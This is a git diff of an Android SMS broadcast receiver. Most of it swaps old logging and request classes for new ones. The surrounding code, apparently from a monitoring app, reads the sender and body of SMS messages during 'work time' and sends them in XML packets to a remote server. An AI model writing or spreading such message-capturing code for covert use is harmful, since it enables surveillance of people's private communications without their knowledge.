@@ -15,9 +15,10 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.inet.android.bs.FileLog;
 import com.inet.android.bs.RequestMakerImpl;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private static final String TAG = "SMS";
@@ -35,22 +36,18 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		String sms = sp.getString("KBD", "0");
 
 		if (sms.equals("0")) {
-			Log.d(TAG, "KBD = 0");
-			FileLog.writeLog("sms: KBD = 0");
+			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
 			return;
 		}
 
 		boolean isWork = WorkTimeDefiner.isDoWork(context);
 		if (!isWork) {
-			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
-			Log.d(TAG, "after isWork retrun 0");
-			FileLog.writeLog("sms: isWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("sms: after isWork retrun 0");
+			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
+					"isWork return " + Boolean.toString(isWork));
 
 			return;
 		} else {
-			Log.d(TAG, Boolean.toString(isWork));
-			FileLog.writeLog("sms: " + Boolean.toString(isWork));
+			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
 		}
 		try {
 			mContext = context;
@@ -65,8 +62,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 						Uri.parse("content://sms"), true, smsSentObserver);
 			}
 		} catch (Exception sgh) {
-			Log.e(TAG, "Error in Init : " + sgh.toString());
-			FileLog.writeLog("sms: Error in Init : " + sgh.toString());
+			Logging.doLog(TAG, "Error in Init : " + sgh.toString(), "Error in Init : " + sgh.toString());
 		}
 	}
 
@@ -108,15 +104,17 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 						+ adress + "</ttl><cdata1>" + bodyText.toString()
 						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
 
-				req = new RequestMakerImpl(mContext);
-				req.sendDataRequest(sendStr);
-				Log.d("smsRec", sendStr);
-				FileLog.writeLog("sms: " + sendStr);
+//				req = new RequestMakerImpl(mContext);
+//				req.sendDataRequest(sendStr);
+				
+				DataRequest dr = new DataRequest(mContext);
+				dr.sendRequest(sendStr);
+				
+				Logging.doLog(TAG, sendStr, sendStr);
 
 			}
 		} catch (Exception sfgh) {
-			Log.e(TAG, "Error in getSMSDetails : " + sfgh.toString());
-			FileLog.writeLog("sms: Error in getSMSDetails : " + sfgh.toString());
+			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(), "Error in getSMSDetails : " + sfgh.toString());
 		}
 	}
 
